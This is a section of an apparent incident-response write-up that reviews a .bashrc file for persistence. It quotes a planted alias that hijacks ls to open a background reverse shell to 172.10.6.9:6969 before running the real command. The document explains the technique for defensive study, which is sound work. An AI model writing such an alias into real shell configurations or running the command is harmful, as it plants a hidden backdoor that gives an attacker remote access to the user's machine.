### 3. Shell Configuration Review – `.bashrc`

#### Objective
Determine whether the user’s shell configuration had been modified to introduce malicious behavior or persistence upon command execution or login.

---

#### Method Used

```bash
cat ~/.bashrc

```
The .bashrc file was reviewed to inspect custom aliases, functions, or commands that execute automatically when a shell session starts or when specific commands are run.


## Findings
Malicious Bash Alias Identified

Command Modified: ls

Behavior: Executes a reverse shell before running the legitimate ls command

```bash

ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'

```

## Analysis
The attacker redefined the ls command to silently spawn a background reverse shell connection to an external IP address. By appending the legitimate ls --color=auto, the malicious activity remains hidden from the user.

This technique ensures:

Stealthy execution

Repeated callback capability

Persistence through normal user behavior

Any time the ls command is executed, the reverse shell is triggered.

## Why This Matters
Shell configuration files such as .bashrc are common targets for persistence because they:

Execute automatically

Are rarely audited

Affect normal command usage

Reviewing .bashrc is a critical incident response step for uncovering stealthy user-level backdoors and command hijacking techniques.







